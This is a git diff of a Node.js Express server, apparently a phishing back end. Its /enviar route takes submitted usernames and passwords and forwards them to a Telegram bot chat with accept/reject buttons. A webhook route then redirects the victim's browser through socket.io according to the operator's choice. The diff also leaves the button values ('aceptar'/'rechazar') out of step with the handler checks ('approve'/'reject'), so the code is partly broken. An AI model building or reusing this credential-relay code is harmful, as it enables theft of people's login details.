@@ -36,11 +36,42 @@ io.on('connection', (socket) => {
   });
 });
 
-// Ruta POST que recibe email y password desde el formulario
 app.post('/enviar', async (req, res) => {
-  const { usuario, contrasena } = req.body;
+  const { usuario, clave } = req.body;
 
-  const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+  const mensaje = `🔐 Nuevo intento de acceso:\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}`;
+
+  const opciones = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
+        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
+      ]
+    }
+  };
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      ...opciones
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+app.post('/webhook', async (req, res) => {
+  const { callback_query } = req.body;
+  if (!callback_query) return res.sendStatus(200);
+
+  const data = callback_query.data;
+  const chat_id = callback_query.from.id;
+
+  let link = '';
+  let mensaje = '';
 
  // Esto depende de cómo manejás los botones, pero algo así:
 if (data === 'approve') {
@@ -56,39 +87,6 @@ if (data === 'reject') {
     currentSocket.emit('redirect', '/denegado.html'); // Otra URL
   }
 }
-
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      ...opciones
-    })
-  });
-
-  res.sendStatus(200);
-});
-
-// Webhook de Telegram para manejar botones
-app.post('/webhook', async (req, res) => {
-  const { callback_query } = req.body;
-  if (!callback_query) return res.sendStatus(200);
-
-  const data = callback_query.data;
-  const chat_id = callback_query.from.id;
-
-  let link = '';
-  let mensaje = '';
-
-  if (data === 'aceptar') {
-    link = 'https://www.mariohernandez.com.co';
-    mensaje = '✅ ¡Acceso aprobado!';
-  } else if (data === 'rechazar') {
-    link = 'https://as.com';
-    mensaje = '❌ Acceso denegado.';
-  }
 
   if (currentSocket) {
     currentSocket.emit('decision', { tipo: data, url: link });
